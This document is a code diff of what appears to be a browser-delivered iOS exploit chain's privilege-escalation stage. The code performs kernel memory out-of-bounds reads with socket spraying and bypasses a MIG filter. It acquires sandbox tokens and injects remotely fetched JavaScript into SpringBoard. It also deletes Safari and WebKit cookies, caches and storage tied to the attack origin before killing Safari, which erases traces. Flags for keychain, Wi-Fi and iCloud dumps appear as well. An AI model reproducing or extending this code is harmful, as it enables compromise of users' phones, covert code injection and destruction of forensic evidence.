@@ -14,8 +14,6 @@
     LOG = function(msg) { console.log('[PE] ' + msg); };
   }
 
-  const ENABLE_CHAIN_SYSLOG_EXPORT = false;
-
   function peAck(stage) {
     try {
       if (typeof globalThis.__pe_ack_addr === 'bigint' && typeof uwrite64 === 'function') {
@@ -1279,10 +1277,6 @@
       uwrite64(wired_address + 0x8n, wired_address);
     }
     let target_inp_gencnt_list = [];
-    const zone_trim_sleep_seconds = is_a18_devices ? 35n : 20n;
-    const post_trim_restart_offset = is_a18_devices ? 0x150000n : 0xffffffffffffffffn;
-    const max_mapping_restarts = is_a18_devices ? 4 : 0;
-    let mapping_restart_count = 0;
     LOG("[i] Allocating memory done");
     while (true) {
       let search_mapping_size = 0x800n * PAGE_SIZE;
@@ -1306,19 +1300,12 @@
       socket_ports = [];
       socket_pcb_ids = [];
       socket_ports_count = 0n;
-      let max_sockets_count = is_a18_devices ? 0x5000n : 0x5800n;
-      let split_count = is_a18_devices ? 10n : 8n;
+      let max_sockets_count = 0x5800n;
+      let split_count = 8n;
       let wired_pages = [];
       let success = false;
-      let restart_mapping = false;
-      let zone_trimmed = false;
       let seeking_offset = 0n;
       while (seeking_offset < search_mapping_size) {
-        if (zone_trimmed && seeking_offset >= post_trim_restart_offset) {
-          restart_mapping = true;
-          LOG("[+] post-trim search budget reached at offset " + seeking_offset.hex() + "; restarting mapping");
-          break;
-        }
         kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
         if (kr != KERN_SUCCESS) {
           seeking_offset += PAGE_SIZE;
@@ -1358,9 +1345,8 @@
           } else {
             if (socket_ports_count >= max_sockets_count) {
               sockets_release();
-              zone_trimmed = true;
-              LOG("[+] waiting for zone trimming... sleep=" + zone_trim_sleep_seconds.toString() + " sockets=" + max_sockets_count.hex() + " split=" + split_count.hex());
-              sleep(zone_trim_sleep_seconds);
+              LOG("[+] waiting for zone trimming...");
+              sleep(20n);
             }
             seeking_offset = 0n;
           }
@@ -1378,23 +1364,13 @@
         exit(0n);
       }
       sockets_release();
-      surface_munlock(search_mapping_address, search_mapping_size);
       kr = mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
       if (success == true) {
         break;
       }
-      if (restart_mapping) {
-        mapping_restart_count++;
-        LOG("[+] restarted PE search mapping count=" + mapping_restart_count + " max=" + max_mapping_restarts);
-        if (max_mapping_restarts && mapping_restart_count >= max_mapping_restarts) {
-          LOG("[-] PE search mapping restart budget exhausted; exiting to avoid panic-prone long scan");
-          exit(0n);
-        }
-      }
     }
     for (let i = 0n; i < BigInt(wired_mapping_entries_addresses.length); i++) {
       let wired_page = wired_mapping_entries_addresses[i];
-      surface_munlock(wired_page, wired_mapping_entry_size);
       mach_vm_deallocate(mach_task_self(), wired_page, wired_mapping_entry_size);
     }
   }
@@ -6669,8 +6645,6 @@ class Sandbox {
 			this.getTokenForPath("/private/var/tmp/", true);
 			this.getTokenForPath("/tmp/", true);
 			this.getTokenForPath("/private/var/mobile/Media/", true);
-			this.getTokenForPath("/private/var/mobile/Media/Downloads/", true);
-			this.getTokenForPath("/var/mobile/Media/Downloads/", true);
 			this.getTokenForPath("/private/var/mobile/Containers/Data/Application/", true);
 			this.getTokenForPath("/var/mobile/Containers/Data/Application/", true);
 			this.getTokenForPath("/private/var/mobile/Containers/Shared/AppGroup/", true);
@@ -8432,15 +8406,39 @@ class MigFilterBypass {
 		//Native.write64(threadMem, lock.kernelSlide);
 		//Native.write64(threadMem + 0x8n, lock.lockAddr);
 		//console.log(TAG, `Spawn bypass thread with args: kernelSlide=${Utils.hex(lock.kernelSlide)}, lockAddr=${Utils.hex(lock.lockAddr)}`);
-		const threadCode = "fcall_init(); " + _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__["default"];
+		// Syslog shim: test whether func_resolve and syslog work, then
+		// override console.log so the 123 log calls in the MigFilterBypass
+		// webpack bundle reach idevicesyslog.
+		const syslogShim = [
+			"var __shim_ok=0;",
+			"try{",
+			"  var _syslog=func_resolve('syslog');",
+			"  var _fmt=get_cstring('%s');",
+			"  fcall(_syslog,5,_fmt,get_cstring('[MIG-THREAD] syslog shim init OK'),0,0,0,0,0);",
+			"  var _origLog=console.log;",
+			"  console.log=function(){",
+			"    var s='';for(var i=0;i<arguments.length;i++){if(i>0)s+=' ';s+=String(arguments[i]);}",
+			"    try{fcall(_syslog,5,_fmt,get_cstring(s.length>1020?s.substring(0,1020):s),0,0,0,0,0);}catch(e){}",
+			"    _origLog.apply(console,arguments);",
+			"  };",
+			"  __shim_ok=1;",
+			"}catch(e){",
+			"  try{var _s2=func_resolve('syslog');var _f2=get_cstring('%s');fcall(_s2,5,_f2,get_cstring('[MIG-THREAD] shim FAILED: '+String(e)),0,0,0,0,0);}catch(e2){}",
+			"}"
+		].join("");
+		const threadCode = "fcall_init(); " + syslogShim + _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__["default"];
 		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].threadSpawn(threadCode, threadMem);
 
+		let migStarted = false;
 		for (let i=0; i<10; i++) {
 			let isRunning = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(this.#isRunningPtr);
-			if (isRunning)
+			if (isRunning) {
+				migStarted = true;
 				break;
+			}
 			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", 500000);
 		}
+		LOG("[PE] MigFilterBypass thread " + (migStarted ? "started OK" : "FAILED to start (timeout after 5s)"));
 
 		this.#running = true;
 	}
@@ -8485,23 +8483,25 @@ const ENABLE_CORUNA_TWEAKLOADER = false;
 // Tweak enable flags are driven by globalThis values prepended to pe_main.js by
 // sbx1_main.js's spawn_pe(). This lets index.html pick which tweaks to install
 // in a single chain run. index.html can select any subset; each flag drives an
-// independent payload injection. Missing flags mean no SpringBoard payload;
-// the SpringBoard RemoteCall path is the least stable piece on reruns.
-const ENABLE_SPRINGBOARD_JS_TWEAK = !!globalThis.__ls_enable_fiveicon;
+// independent payload injection. Defaults to fiveicon if no tweak flags are
+// specified (e.g. when pe_main.js is run standalone without the sbx1 prelude).
+const ENABLE_SPRINGBOARD_JS_TWEAK = (typeof globalThis.__ls_enable_fiveicon === 'undefined' && typeof globalThis.__ls_enable_powercuff === 'undefined' && typeof globalThis.__ls_enable_mgpatcher === 'undefined' && typeof globalThis.__ls_enable_applimit === 'undefined') ? true : !!globalThis.__ls_enable_fiveicon;
 const SPRINGBOARD_JS_TWEAK_PATH = "/sbcustomizer_light.js";
 const SPRINGBOARD_JS_TWEAK_LABEL = "SBCustomizer JS";
-const CHAIN_STATUS_LOG_PATH = "/private/var/tmp/brokenblade_chain_status.log";
+const ENABLE_CHAIN_STATUS_OVERLAY = globalThis.__ls_enable_chain_overlay === true;
+const CHAIN_STATUS_OVERLAY_PATH = "/chain_status_overlay.js";
+const CHAIN_STATUS_OVERLAY_LABEL = "Chain Status Overlay";
+const CHAIN_STATUS_LOG_PATH = "/private/var/tmp/lightsaber_chain_status.log";
 const CHAIN_STATUS_MAX_BUFFER_LINES = 192;
-const CHAIN_SYSLOG_DOWNLOADS_DIR = "/private/var/mobile/Media/Downloads/";
-const CHAIN_SYSLOG_DOWNLOADS_PATH = CHAIN_SYSLOG_DOWNLOADS_DIR + "brokenblade_chain_syslog.log";
-const CHAIN_SYSLOG_MAX_BUFFER_LINES = 4096;
 const ENABLE_POWERCUFF_TWEAK = !!globalThis.__ls_enable_powercuff;
 const POWERCUFF_TWEAK_PATH = "/powercuff_light.js";
 const POWERCUFF_TWEAK_LABEL = "Powercuff";
-const ENABLE_THREEAPP = !!globalThis.__ls_enable_threeapp;
-const ENABLE_SAFARI_ORIGIN_AUDIT = true;
-const ENABLE_SAFARI_ORIGIN_DELETE = true;
-const ENABLE_SAFARI_KILL_AFTER_CLEAN = true;
+const ENABLE_MGPATCHER = !!globalThis.__ls_enable_mgpatcher;
+const MG_FLAGS = (typeof globalThis.__mg_flags === 'string') ? globalThis.__mg_flags : '';
+const MG_UNFLAGS = (typeof globalThis.__mg_unflags === 'string') ? globalThis.__mg_unflags : '';
+const ENABLE_APPLIMIT_REQUESTED = !!globalThis.__ls_enable_applimit;
+const ENABLE_APPLIMIT = false;
+const ENABLE_SPRINGBOARD_AGENT = ENABLE_CORUNA_TWEAKLOADER || ENABLE_SPRINGBOARD_JS_TWEAK || ENABLE_CHAIN_STATUS_OVERLAY;
 // sbcustomizer_light.js dispatches to the SpringBoard main thread
 // asynchronously. When it runs without Powercuff piggybacking on it, keep the
 // chain alive briefly so the dispatched main-thread work has time to run
@@ -8512,12 +8512,13 @@ const ENABLE_KEYCHAIN_DUMP = false;
 const ENABLE_WIFI_DUMP = false;
 const ENABLE_ICLOUD_DUMP = false;
 const ENABLE_DUMP_COPYOUT = false;
+const ENABLE_SAFARI_ORIGIN_AUDIT = true;
+const ENABLE_SAFARI_ORIGIN_DELETE = true;
+const ENABLE_SAFARI_KILL_AFTER_CLEAN = true;
 
 let chainStatusLogReady = false;
 let chainStatusBuffer = [];
 let chainStatusLastLine = "";
-let chainSyslogLogReady = false;
-let chainSyslogPath = CHAIN_SYSLOG_DOWNLOADS_PATH;
 const CHAIN_STATUS_FILTER_RE = /\[PE\]|\[PE-DBG\]|\[SBX1\]|\[SBC\]|\[POWERCUFF\]|\[FILE-DL\]|\[FILE-DL-EARLY\]|\[HTTP-UPLOAD\]|\[APP\]|\[ICLOUD\]|\[KEYCHAIN\]|\[WIFI\]|\[THREEAPP\]|\[THREEAPP-AUDIT\]|\[SAFARI-CLEAN\]|\[MG\]|\[MPD\]|\[APPLIMIT\]|nativeCallBuff|kernel_base|kernel_slide|SBX0|SBX1|sbx0:|sbx1:|MIG_FILTER_BYPASS |INJECTJS |CHAIN |DRIVER-POSTEXPL |DRIVER-NEWTHREAD |DARKSWORD-WIFI-DUMP |INFO |OFFSETS |FILE-UTILS |PORTRIGHTINSERTER |REGISTERSSTRUCT |REMOTECALL |TASK(?:ROP)? |THREAD |VM |MAIN |EXCEPTION |SANDBOX |PAC (?:diagnostics|ptrs|gadget)|UTILS |^\[[+\-!i]\]\s/i;
 const chainStatusOriginalLog = LOG;
 LOG = function(msg) {
@@ -8528,64 +8529,6 @@ LOG = function(msg) {
 		try { console.log(String(msg)); } catch (_) {}
 	}
 };
-
-function chainSyslogTimestamp() {
-	try {
-		return new Date().toISOString();
-	} catch (_) {
-		return "unknown-time";
-	}
-}
-
-function chainSyslogCleanLine(raw) {
-	let line = String(raw || "").replace(/[\r\n]+/g, " ").trim();
-	if (line.length > 2048) line = line.slice(0, 2045) + "...";
-	return line;
-}
-
-function chainSyslogFormatLine(raw) {
-	let line = chainSyslogCleanLine(raw);
-	if (!line) return "";
-	return "[" + chainSyslogTimestamp() + "] " + line;
-}
-
-function chainSyslogBufferLine(line) {
-	if (!line) return;
-	try {
-		if (!globalThis.__bb_chain_syslog_buffer)
-			globalThis.__bb_chain_syslog_buffer = [];
-		globalThis.__bb_chain_syslog_buffer.push(line);
-		if (globalThis.__bb_chain_syslog_buffer.length > CHAIN_SYSLOG_MAX_BUFFER_LINES)
-			globalThis.__bb_chain_syslog_buffer.shift();
-	} catch (_) {}
-}
-
-function chainSyslogRecord(raw) {
-	if (!ENABLE_CHAIN_SYSLOG_EXPORT) return;
-	let line = chainSyslogFormatLine(raw);
-	if (!line) return;
-	if (!chainSyslogLogReady) {
-		chainSyslogBufferLine(line);
-		return;
-	}
-	chainSyslogWriteLine(line, false, false);
-}
-
-globalThis.__bb_chain_syslog_sink = ENABLE_CHAIN_SYSLOG_EXPORT ? chainSyslogRecord : null;
-const chainSyslogOriginalConsoleLog = console.log;
-if (ENABLE_CHAIN_SYSLOG_EXPORT && !globalThis.__bb_chain_console_wrapped && typeof chainSyslogOriginalConsoleLog === "function") {
-	globalThis.__bb_chain_console_wrapped = true;
-	console.log = function(...args) {
-		try {
-			if (!globalThis.__bb_chain_syslog_forwarding) {
-				let parts = [];
-				for (let arg of args) parts.push(String(arg));
-				chainSyslogRecord(parts.join(" "));
-			}
-		} catch (_) {}
-		return chainSyslogOriginalConsoleLog.apply(this, args);
-	};
-}
 
 function chainStatusCleanLine(raw) {
 	let line = String(raw || "").replace(/[\r\n]+/g, " ").trim();
@@ -8644,76 +8587,6 @@ function chainStatusInitLog() {
 	chainStatusBuffer = [];
 }
 
-function chainSyslogWriteLine(line, truncate, forceSync) {
-	if (!ENABLE_CHAIN_SYSLOG_EXPORT) return false;
-	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
-	const O_WRONLY = 0x0001;
-	const O_APPEND = 0x0008;
-	const O_CREAT = 0x0200;
-	const O_TRUNC = 0x0400;
-	let flags = O_WRONLY | O_CREAT | (truncate ? O_TRUNC : O_APPEND);
-	let fd = Native.callSymbol("open", chainSyslogPath, flags, 0o644);
-	if (Number(fd) < 0) return false;
-	let ptr = 0n;
-	try {
-		let out = chainSyslogCleanLine(line) + "\n";
-		let data = Native.stringToBytes(out, false);
-		ptr = Native.callSymbol("malloc", BigInt(data.byteLength));
-		if (!ptr || ptr === 0n) return false;
-		Native.write(ptr, data);
-		Native.callSymbol("write", fd, ptr, data.byteLength);
-		Native.callSymbol("fchmod", fd, 0o644);
-		if (forceSync) Native.callSymbol("fsync", fd);
-		return true;
-	} finally {
-		if (ptr) Native.callSymbol("free", ptr);
-		Native.callSymbol("close", fd);
-	}
-}
-
-function chainSyslogSync() {
-	if (!ENABLE_CHAIN_SYSLOG_EXPORT) return false;
-	if (!chainSyslogLogReady) return false;
-	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
-	const O_WRONLY = 0x0001;
-	let fd = Native.callSymbol("open", chainSyslogPath, O_WRONLY, 0o644);
-	if (Number(fd) < 0) return false;
-	try {
-		Native.callSymbol("fsync", fd);
-		return true;
-	} finally {
-		Native.callSymbol("close", fd);
-	}
-}
-
-function chainSyslogInitDownloads() {
-	if (!ENABLE_CHAIN_SYSLOG_EXPORT) {
-		try { globalThis.__bb_chain_syslog_buffer = []; } catch (_) {}
-		return false;
-	}
-	if (chainSyslogLogReady) return true;
-	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
-	try {
-		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath("/private/var/mobile/Media/Downloads/", true);
-		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath("/var/mobile/Media/Downloads/", true);
-		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath("/private/var/mobile/Media/", true);
-	} catch (_) {}
-	try {
-		Native.callSymbol("mkdir", "/private/var/mobile/Media", 0o777n);
-		Native.callSymbol("mkdir", "/private/var/mobile/Media/Downloads", 0o777n);
-		Native.callSymbol("chmod", "/private/var/mobile/Media/Downloads", 0o777n);
-	} catch (_) {}
-	let resetLine = "[" + chainSyslogTimestamp() + "] [PE] chain syslog export reset path=" + chainSyslogPath;
-	if (!chainSyslogWriteLine(resetLine, true, true)) return false;
-	chainSyslogLogReady = true;
-	try {
-		let pending = globalThis.__bb_chain_syslog_buffer || [];
-		for (let line of pending) chainSyslogWriteLine(line, false, false);
-		globalThis.__bb_chain_syslog_buffer = [];
-	} catch (_) {}
-	chainSyslogWriteLine("[" + chainSyslogTimestamp() + "] [PE] chain syslog export active", false, true);
-	return true;
-}
 
 function fetchRemoteScript(path) {
 	if (!PE_ENABLE_DEBUG_NETWORK) {
@@ -8894,6 +8767,33 @@ function injectLightweightSpringBoardPayload(existingTask, migFilterBypass, agen
 	} catch (e) {
 		LOG("[PE] " + label + " inject exception: " + String(e));
 		LOG("[PE] " + label + " stack: " + (e.stack || "no stack"));
+		return false;
+	}
+}
+
+function injectChainStatusOverlay(existingTask, migFilterBypass, agentPid) {
+	LOG("[PE] Injecting " + CHAIN_STATUS_OVERLAY_LABEL + " into SpringBoard...");
+	LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " code source: " + (typeof globalThis.__chain_status_overlay_code === 'string' && globalThis.__chain_status_overlay_code.length > 0 ? "prefetched (" + globalThis.__chain_status_overlay_code.length + " bytes)" : "fetchRemoteScript(" + CHAIN_STATUS_OVERLAY_PATH + ")"));
+	let code = (typeof globalThis.__chain_status_overlay_code === 'string' && globalThis.__chain_status_overlay_code.length > 0) ? globalThis.__chain_status_overlay_code : fetchRemoteScript(CHAIN_STATUS_OVERLAY_PATH);
+	if (!code) {
+		LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " fetch failed");
+		return false;
+	}
+	const prelude =
+		'globalThis.__ls_chain_status_path = ' + JSON.stringify(CHAIN_STATUS_LOG_PATH) + ';\n' +
+		'globalThis.__bb_chain_status_path = ' + JSON.stringify(CHAIN_STATUS_LOG_PATH) + ';\n' +
+		'globalThis.__ls_chain_status_complete_marker = "[PE] start() completed successfully";\n' +
+		'globalThis.__bb_chain_status_complete_marker = "[PE] start() completed successfully";\n';
+	code = prelude + code;
+	LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " code loaded: " + code.length + " bytes");
+	try {
+		let loader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](existingTask, code, migFilterBypass);
+		let ok = loader.inject(agentPid);
+		LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " inject result: " + ok);
+		return ok;
+	} catch (e) {
+		LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " inject exception: " + String(e));
+		LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " stack: " + (e.stack || "no stack"));
 		return false;
 	}
 }
@@ -9084,31 +8984,49 @@ function terminateSafariAfterClean(remoteKillTask) {
 	function auditSafariOriginData() {
 		const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
 		const Sandbox = libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"];
-		const MAX_SCAN_ENTRIES = 1800;
-		const MAX_CANDIDATE_LOGS = 80;
-		const MAX_CONTENT_SCAN_FILES = 120;
-		const MAX_CONTENT_SCAN_BYTES_PER_FILE = 64 * 1024;
-		const MAX_TOTAL_CONTENT_SCAN_BYTES = 4 * 1024 * 1024;
-		const MAX_DELETE_TREE_ENTRIES = 900;
+		const MAX_SCAN_ENTRIES = 5000;
+		const MAX_CANDIDATE_LOGS = 200;
+		const MAX_CONTENT_SCAN_FILES = 260;
+		const MAX_CONTENT_SCAN_BYTES_PER_FILE = 1024 * 1024;
+		const MAX_TOTAL_CONTENT_SCAN_BYTES = 24 * 1024 * 1024;
+		const MAX_DELETE_TREE_ENTRIES = 2400;
 	const tokenPaths = [
 		"/private/var/mobile/Library/",
 		"/private/var/mobile/Library/WebKit/",
+		"/private/var/mobile/Library/WebKit/WebsiteDataStore/",
+		"/private/var/mobile/Library/WebKit/WebsiteData/",
 		"/private/var/mobile/Library/WebKit/WebsiteData/Default/",
+		"/private/var/mobile/Library/WebKit/WebsiteData/IndexedDB/",
+		"/private/var/mobile/Library/WebKit/WebsiteData/LocalStorage/",
 		"/private/var/mobile/Library/WebKit/WebsiteData/ResourceLoadStatistics/",
-		"/private/var/mobile/Library/WebKit/WebsiteData/ServiceWorkers/",
 		"/private/var/mobile/Library/Safari/",
 		"/private/var/mobile/Library/Caches/",
+		"/private/var/mobile/Library/Caches/com.apple.mobilesafari/",
+		"/private/var/mobile/Library/Caches/com.apple.WebKit.Networking/",
+		"/private/var/mobile/Library/Caches/WebKit/",
 		"/private/var/mobile/Library/Caches/WebKit/NetworkCache/",
+		"/private/var/mobile/Library/Caches/WebKit/ServiceWorkers/",
+		"/private/var/mobile/Library/Caches/WebKit/HSTS/",
+		"/private/var/mobile/Library/Caches/WebKit/AlternativeServices/",
 		"/private/var/mobile/Library/Cookies/",
-		"/private/var/mobile/Containers/Data/Application/"
+		"/private/var/mobile/Containers/Data/Application/",
+		"/var/mobile/Containers/Data/Application/",
+		"/private/var/mobile/Containers/Shared/AppGroup/"
 	];
 	let roots = [
-		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/Default/", depth: 2 },
-		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/ResourceLoadStatistics/", depth: 1 },
-		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/ServiceWorkers/", depth: 2 },
-		{ path: "/private/var/mobile/Library/Safari/", depth: 1 },
+		{ path: "/private/var/mobile/Library/WebKit/", depth: 8 },
+		{ path: "/private/var/mobile/Library/WebKit/WebsiteDataStore/", depth: 8 },
+		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/Default/", depth: 6 },
+		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/IndexedDB/", depth: 6 },
+		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/LocalStorage/", depth: 5 },
+		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/ResourceLoadStatistics/", depth: 4 },
+		{ path: "/private/var/mobile/Library/Safari/", depth: 5 },
+		{ path: "/private/var/mobile/Library/Caches/com.apple.mobilesafari/", depth: 6 },
+		{ path: "/private/var/mobile/Library/Caches/com.apple.WebKit.Networking/", depth: 6 },
+		{ path: "/private/var/mobile/Library/Caches/WebKit/", depth: 6 },
 		{ path: "/private/var/mobile/Library/Caches/WebKit/NetworkCache/", depth: 5 },
-		{ path: "/private/var/mobile/Library/Cookies/", depth: 1 }
+		{ path: "/private/var/mobile/Library/Caches/WebKit/ServiceWorkers/", depth: 5 },
+		{ path: "/private/var/mobile/Library/Cookies/", depth: 3 }
 	];
 	const recordStores = [
 		"/private/var/mobile/Library/Cookies/Cookies.binarycookies",
@@ -9272,7 +9190,7 @@ function terminateSafariAfterClean(remoteKillTask) {
 		let queuedTreeDeleteLogs = 0;
 		let queuedTreeDeleted = 0;
 
-	LOG("[SAFARI-CLEAN] targeted paths: Safari state DBs, WebKit WebsiteData/Default origin files, ResourceLoadStatistics DBs, ServiceWorkers DBs, NetworkCache records");
+	LOG("[SAFARI-CLEAN] WebKit 22F76 paths: Library/WebKit/{WebsiteDataStore,WebsiteData/{Default,IndexedDB,LocalStorage,ResourceLoadStatistics}}, Library/Caches/WebKit/{NetworkCache,ServiceWorkers,HSTS,AlternativeServices}, Library/Caches/com.apple.WebKit.Networking");
 
 		function matchCandidate(path) {
 			let lower = String(path || "").toLowerCase();
@@ -9287,38 +9205,6 @@ function terminateSafariAfterClean(remoteKillTask) {
 			}
 		}
 			return null;
-		}
-
-		function matchHostInString(value) {
-			let lower = String(value || "").toLowerCase();
-			for (let v of hostVariants) {
-				if (v && lower.indexOf(v.toLowerCase()) >= 0) {
-					return { scope: "origin", token: v };
-				}
-			}
-			return null;
-		}
-
-		function matchPathInString(value) {
-			let lower = String(value || "").toLowerCase();
-			for (let v of pathVariants) {
-				if (v && lower.indexOf(v.toLowerCase()) >= 0) {
-					return { scope: "path", token: v };
-				}
-			}
-			return null;
-		}
-
-		function matchContentCandidate(value, path) {
-			let hostMatch = matchHostInString(value);
-			if (!hostMatch) return null;
-			let lowerPath = String(path || "").toLowerCase();
-			if (repoToken && lowerPath.indexOf("/networkcache/") >= 0) {
-				let pathMatch = matchPathInString(value);
-				if (!pathMatch) return null;
-				return { scope: "origin+path", token: hostMatch.token + "+" + pathMatch.token };
-			}
-			return hostMatch;
 		}
 
 		function unlinkPath(path) {
@@ -9647,13 +9533,10 @@ function terminateSafariAfterClean(remoteKillTask) {
 
 	function shouldContentScan(path) {
 		let lower = String(path || "").toLowerCase();
-		if (lower.indexOf("/bookmarks.db") >= 0 || lower.indexOf("/cloudtabs.db") >= 0) return false;
-		if (lower.slice(-7) === "/origin") return true;
-		if (sqliteKind(path)) return true;
-		if (lower.indexOf("/networkcache/") >= 0 && lower.indexOf("/records/") >= 0) return true;
 		if (lower.indexOf("/webkit/") < 0 && lower.indexOf("/safari/") < 0 && lower.indexOf("/cookies/") < 0) return false;
 		if (lower.indexOf("/bookmarks.db") >= 0 || lower.indexOf("/cloudtabs.db") >= 0) return false;
-		return false;
+		if (lower.indexOf(".png") >= 0 || lower.indexOf(".jpg") >= 0 || lower.indexOf(".jpeg") >= 0 || lower.indexOf(".gif") >= 0 || lower.indexOf(".mp4") >= 0) return false;
+		return true;
 	}
 
 	function shouldDeleteContentHit(path) {
@@ -9715,7 +9598,7 @@ function terminateSafariAfterClean(remoteKillTask) {
 				let chunk = carry + bytesToLowerSearchString(Native.read(buf, gotNum), gotNum);
 				readForFile += gotNum;
 				contentScannedBytes += gotNum;
-				result = matchContentCandidate(chunk, path);
+				result = matchCandidate(chunk);
 				if (result) break;
 				carry = chunk.slice(-384);
 			}
@@ -9739,18 +9622,6 @@ function terminateSafariAfterClean(remoteKillTask) {
 			}
 			return result;
 		}
-
-	function shouldDescendDir(path, depth) {
-		let lower = String(path || "").toLowerCase();
-		if (lower.indexOf("/networkcache/") >= 0) {
-			return lower.indexOf("/networkcache/version") >= 0 ||
-				lower.indexOf("/records") >= 0 ||
-				lower.indexOf("/resource") >= 0 ||
-				lower.indexOf("/subresources") >= 0;
-		}
-		if (lower.indexOf("/safari/") >= 0 || lower.indexOf("/cookies/") >= 0) return depth < 1;
-		return true;
-	}
 
 	function scanDir(dirPath, depth, maxDepth) {
 		if (scanned >= MAX_SCAN_ENTRIES) {
@@ -9779,7 +9650,7 @@ function terminateSafariAfterClean(remoteKillTask) {
 				if (match) deletedEntry = logCandidate(fullPath, match, dirEntry);
 				if (deletedEntry) continue;
 				if (!dirEntry) scanFileContent(fullPath);
-				if (dirEntry && depth < maxDepth && shouldDescendDir(fullPath, depth + 1)) scanDir(fullPath, depth + 1, maxDepth);
+				if (dirEntry && depth < maxDepth) scanDir(fullPath, depth + 1, maxDepth);
 				if (scanned >= MAX_SCAN_ENTRIES) break;
 			}
 		} finally {
@@ -9822,12 +9693,19 @@ function terminateSafariAfterClean(remoteKillTask) {
 					let safariContainer = rootExists(containerPath + "Library/Safari/") || rootExists(containerPath + "Library/Caches/com.apple.mobilesafari/");
 					if (!safariContainer) continue;
 					let candidates = [
-					{ path: containerPath + "Library/WebKit/WebsiteData/Default/", depth: 2 },
-					{ path: containerPath + "Library/WebKit/WebsiteData/ResourceLoadStatistics/", depth: 1 },
-					{ path: containerPath + "Library/WebKit/WebsiteData/ServiceWorkers/", depth: 2 },
-					{ path: containerPath + "Library/Safari/", depth: 1 },
+						{ path: containerPath + "Library/WebKit/WebsiteDataStore/", depth: 8 },
+					{ path: containerPath + "Library/WebKit/WebsiteData/", depth: 8 },
+					{ path: containerPath + "Library/WebKit/WebsiteData/Default/", depth: 6 },
+					{ path: containerPath + "Library/WebKit/WebsiteData/IndexedDB/", depth: 6 },
+					{ path: containerPath + "Library/WebKit/WebsiteData/LocalStorage/", depth: 5 },
+					{ path: containerPath + "Library/WebKit/WebsiteData/ResourceLoadStatistics/", depth: 4 },
+					{ path: containerPath + "Library/Safari/", depth: 5 },
+					{ path: containerPath + "Library/Caches/com.apple.mobilesafari/", depth: 5 },
+					{ path: containerPath + "Library/Caches/com.apple.WebKit.Networking/", depth: 6 },
+					{ path: containerPath + "Library/Caches/WebKit/", depth: 6 },
 					{ path: containerPath + "Library/Caches/WebKit/NetworkCache/", depth: 5 },
-					{ path: containerPath + "Library/Cookies/", depth: 1 }
+					{ path: containerPath + "Library/Caches/WebKit/ServiceWorkers/", depth: 5 },
+					{ path: containerPath + "Library/Cookies/", depth: 3 }
 				];
 				for (let candidate of candidates) {
 					if (rootExists(candidate.path)) {
@@ -9844,6 +9722,7 @@ function terminateSafariAfterClean(remoteKillTask) {
 	}
 
 	discoverAppContainerRoots("/private/var/mobile/Containers/Data/Application/");
+	discoverAppContainerRoots("/var/mobile/Containers/Data/Application/");
 
 	for (let root of roots) {
 		scanDir(root.path, 0, root.depth);
@@ -9863,7 +9742,35 @@ function terminateSafariAfterClean(remoteKillTask) {
 	return true;
 }
 
-function start() { LOG("[+] PE start() called");
+
+function start() {
+	// Redefine LOG to also call syslog() so all post-exploit logging
+	// reaches idevicesyslog. console.log from an injected JSC context
+	// does NOT reliably appear in device syslog.
+	const _origLOG = LOG;
+	const _syslogNative = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+	LOG = function(msg) {
+		_origLOG(msg);
+		try {
+			let s = String(msg);
+			let ptr = _syslogNative.callSymbol("malloc", BigInt(s.length + 1));
+			if (ptr) {
+				_syslogNative.writeString(ptr, s);
+				_syslogNative.callSymbol("syslog", 5, ptr);
+				_syslogNative.callSymbol("free", ptr);
+			}
+		} catch (_) {}
+	};
+	LOG("[+] PE start() called");
+	const phaseStarts = {};
+	function phaseStart(name) {
+		phaseStarts[name] = Date.now();
+		LOG("[PE-TIME] " + name + " start");
+	}
+	function phaseEnd(name) {
+		let elapsed = Date.now() - (phaseStarts[name] || Date.now());
+		LOG("[PE-TIME] " + name + " done " + elapsed + "ms");
+	}
 	let mutexPtr = null;
 	let migFilterBypass = null;
 	globalThis.xnuVersion = xnuVersion();
@@ -9885,74 +9792,79 @@ function start() { LOG("[+] PE start() called");
 		return;
 
 
+	phaseStart("TaskRop.init");
 	libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__["default"].init();
-	if(migFilterBypass)
+	phaseEnd("TaskRop.init");
+	if(migFilterBypass) {
+		phaseStart("MigFilterBypass.start");
 		migFilterBypass.start();
+		phaseEnd("MigFilterBypass.start");
+	}
+	phaseStart("launchd RemoteCall");
 	let launchdTask = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"]("launchd",migFilterBypass);
+	phaseEnd("launchd RemoteCall");
 	if (!launchdTask.success()) {
